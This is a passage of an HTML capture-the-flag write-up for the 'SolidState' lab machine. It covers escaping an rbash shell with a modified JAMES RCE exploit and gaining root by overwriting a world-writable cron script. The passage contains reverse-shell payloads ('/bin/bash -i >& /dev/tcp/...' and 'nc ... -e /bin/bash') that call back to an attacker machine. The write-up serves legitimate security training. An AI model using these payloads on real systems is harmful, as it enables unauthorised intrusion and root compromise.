+                individual&nbsp;files&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>doc<span style="color:#ff9d00;font-weight:700">/</span>*<span style="color:#ff9d00;font-weight:700">/</span>copyright.<br>
+                <br>
+                Debian&nbsp;GNU<span style="color:#ff9d00;font-weight:700">/</span>Linux&nbsp;comes&nbsp;with&nbsp;ABSOLUTELY&nbsp;NO&nbsp;WARRANTY,&nbsp;to&nbsp;the&nbsp;extent<br>
+                permitted&nbsp;by&nbsp;applicable&nbsp;law.<br>
+                Last&nbsp;<span style="color:#ff9d00;font-weight:700">login:</span>&nbsp;Tue&nbsp;Aug&nbsp;22&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>00<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;2017&nbsp;from&nbsp;192.168.11.142<br>
+                mindy@solidstate<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                bin&nbsp;&nbsp;user.txt<br>
+                mindy@solidstate<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;user.txt<br>
+                914d0a4eb...
+            </div>
+        </div><br>
+        <br>
+        As you'll quickly find out, we're in a restricted shell - an <code>rbash</code> restricted shell.<br>
+            <div class="codebox">
+                mindy@solidstate<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#7f0044;font-weight:400">$SHELL</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>rbash
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Escape Restricted Shell - JAMES RCE Exploit</strong></h2><br>
+        You can escape the restricted shell using the JAMES remote code execution exploit found earlier.<br>
+        <a href="https://www.exploit-db.com/exploits/35513">https://www.exploit-db.com/exploits/35513</a><br>
+        <br>
+        This RCE exploit gets triggered when a user logs into the box.<br>
+        Because we have SSH access to the box as mindy, we can trigger the exploit.<br>
+        <br>
+        Modify the <code>payload</code> variable in the exploit to send a reverse shell back to your attacking machine.<br>
+            <div class="codebox">
+                [...]<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;specify&nbsp;payload</span><br>
+                <span style="color:#0088ff;font-weight:400">#payload&nbsp;=&nbsp;'touch&nbsp;/tmp/proof.txt'&nbsp;#&nbsp;to&nbsp;exploit&nbsp;on&nbsp;any&nbsp;user&nbsp;</span><br>
+                payload&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'/bin/bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/10.10.14.15/9001&nbsp;0&gt;&amp;1'</span><br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Start a listener on your attacking machine to receive the shell<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Run the exploit<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;python&nbsp;james-rce.py&nbsp;10.10.10.51<br>
+                [+]Connecting&nbsp;to&nbsp;James&nbsp;Remote&nbsp;Administration&nbsp;Tool...<br>
+                [+]Creating&nbsp;user...<br>
+                [+]Connecting&nbsp;to&nbsp;James&nbsp;SMTP&nbsp;server...<br>
+                [+]Sending&nbsp;payload...<br>
+                [+]Done<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;Payload&nbsp;will&nbsp;be&nbsp;executed&nbsp;once&nbsp;somebody&nbsp;logs&nbsp;in.
+            </div>
+        </div><br>
+        <br>
+        And SSH in as mindy to trigger the exploit.<br>
+        You should see a reverse shell on your listener.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;mindy@10.10.10.51<br>
+                mindy@10.10.10.51<span style="color:#3ad900;font-weight:400">'s&nbsp;password:&nbsp;<br>
+                [...]</span>
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                [...]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.15]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.51]&nbsp;42722<br>
+                <span style="color:#7f0044;font-weight:400">${debian_chroot</span><span style="color:#ff9d00;font-weight:700">:</span>+<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$debian_chroot</span><span style="color:#ff9d00;font-weight:700">)}</span>mindy@solidstate<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        We can now execute whatever commands we like :)<br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) World-Writable Files</strong></h2><br>
+        Search the system for world-writable files<br>
+            <div class="codebox">
+                <span style="color:#7f0044;font-weight:400">${debian_chroot</span><span style="color:#ff9d00;font-weight:700">:</span>+<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$debian_chroot</span><span style="color:#ff9d00;font-weight:700">)}</span>mindy@solidstate<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-xdev&nbsp;-type&nbsp;f&nbsp;<span style="color:#333333;font-weight:400">\(</span>&nbsp;-perm&nbsp;-0002&nbsp;-a&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;-perm&nbsp;-1000&nbsp;<span style="color:#333333;font-weight:400">\)</span>&nbsp;-print&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>tmp.py
+            </div>
+        </div><br>
+        <br>
+        There's a world-writable python script.<br>
+        Check its permissions.<br>
+            <div class="codebox">
+                <span style="color:#7f0044;font-weight:400">${debian_chroot</span><span style="color:#ff9d00;font-weight:700">:</span>+<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$debian_chroot</span><span style="color:#ff9d00;font-weight:700">)}</span>mindy@solidstate<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-l&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>tmp.py<br>
+                <span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-l&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>tmp.py<br>
+                -rwxrwxrwx&nbsp;1&nbsp;root&nbsp;root&nbsp;105&nbsp;Aug&nbsp;22&nbsp;&nbsp;2017&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>tmp.py<br>
+            </div>
+        </div><br>
+        <br>
+        The script is owned by root, and we have write access to it.<br>
+        If you <code>cat</code> the script you'll see that it's deleting the contents of <code>/tmp</code>.<br>
+            <div class="codebox">
+                <span style="color:#7f0044;font-weight:400">${debian_chroot</span><span style="color:#ff9d00;font-weight:700">:</span>+<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$debian_chroot</span><span style="color:#ff9d00;font-weight:700">)}</span>mindy@solidstate<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>tmp.py<br>
+                <span style="color:#0088ff;font-weight:400">#!/usr/bin/env&nbsp;python</span><br>
+                import&nbsp;os<br>
+                import&nbsp;sys<br>
+                try<span style="color:#ff9d00;font-weight:700">:</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'rm&nbsp;-r&nbsp;/tmp/*&nbsp;'</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                except<span style="color:#ff9d00;font-weight:700">:</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.<span style="color:#ffdd00;font-weight:400">exit()</span>
+            </div>
+        </div><br>
+        <br>
+        If a cronjob is running this file as root, we'll have root code code execution because we can modify the file.<br>
+        <br>
+        We don't know that there's a root cronjob running this file, but it's not overly optimistic to presume that there might be.<br>
+        <br>
+        Deleting all the files in <code>/tmp</code> is one command - <code>rm -r /tmp/*</code>.<br>
+        Why would an admin create a script for a command that can by typed in under a second? Probably because they've set up a cronjob.<br>
+        <br>
+        If you ever see a file owned by root that you have write access to it, modify it.<br>
+        You never know, that file might be running as a cronjob and give you code execution.<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) Modify /opt/tmp.py</strong></h2><br>
+        I took the existing python code and modified it to send myself a reverse shell, but you could write anything.<br>
+        <code>echo -e</code> enables interpretation of backslash escapes, meaning we can format our echoed input to include newlines - <code>\n</code> - and tabs - <code>\t</code>.<br>
+        <br>
+        My python script looked like this:<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#!/usr/bin/env&nbsp;python</span><br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;os<br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;sys<br>
+                <span style="color:#ff9d00;font-weight:700">try</span>:<br>
+                os.system(<span style="color:#3ad900;font-weight:400">"nc&nbsp;10.10.14.15&nbsp;9002&nbsp;-e&nbsp;/bin/bash"</span>)<br>
+                <span style="color:#ff9d00;font-weight:700">except</span>:<br>
+                sys.exit()
+            </div>
+        </div><br>
+        <br>
+        And my echo command to write the above script into a file, properly formatted, was this:<br>
+        <code>echo -e '#!/usr/bin/env python\nimport os\nimport sys\ntry:\n\tos.system("nc 10.10.14.15 9002 -e /bin/bash")\nexcept:\n\tsys.exit()' &gt; /opt/tmp.py</code><br>
+        <br>
+            <div class="codebox">
+                <span style="color:#7f0044;font-weight:400">${debian_chroot</span><span style="color:#ff9d00;font-weight:700">:</span>+<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$debian_chroot</span><span style="color:#ff9d00;font-weight:700">)}</span>mindy@solidstate<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;-e&nbsp;<span style="color:#3ad900;font-weight:400">'#!/usr/bin/env&nbsp;python\nimport&nbsp;os\nimport&nbsp;sys\ntry:\n\tos.system("nc&nbsp;10.10.14.15&nbsp;9002&nbsp;-e&nbsp;/bin/bash")\nexcept:\n\tsys.exit()'</span>&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>tmp.py<br>
+                <span style="color:#7f0044;font-weight:400">${debian_chroot</span><span style="color:#ff9d00;font-weight:700">:</span>+<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$debian_chroot</span><span style="color:#ff9d00;font-weight:700">)}</span>mindy@solidstate<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>tmp.py<br>
+                <span style="color:#0088ff;font-weight:400">#!/usr/bin/env&nbsp;python</span><br>
+                import&nbsp;os<br>
+                import&nbsp;sys<br>
+                try<span style="color:#ff9d00;font-weight:700">:</span><br>
+                os.system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"nc&nbsp;10.10.14.15&nbsp;9002&nbsp;-e&nbsp;/bin/bash"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                except<span style="color:#ff9d00;font-weight:700">:</span><br>
+                sys.<span style="color:#ffdd00;font-weight:400">exit()</span>
+            </div>
+        </div><br>
+        <br>
+        Start a listener on your attacking machine and wait.<br>
+        You should receive a root shell.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate#&nbsp;nc&nbsp;-lvnp&nbsp;9002<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.15]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.51]&nbsp;48814<br>
+                <span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>root.txt<br>
+                b4c9723a2...
+            </div>
+        </div><br>
+        <br>
+        If you check root's cronjobs, our suspicions were correct.<br>
+        There was a cronjob running /opt/tmp.py every 3 minutes (?).<br>
+            <div class="codebox">
+                crontab&nbsp;-l<br>
+                [...]<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;m&nbsp;h&nbsp;&nbsp;dom&nbsp;mon&nbsp;dow&nbsp;&nbsp;&nbsp;command</span><br>
+                *<span style="color:#ff9d00;font-weight:700">/</span>3&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;python&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>tmp.py
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
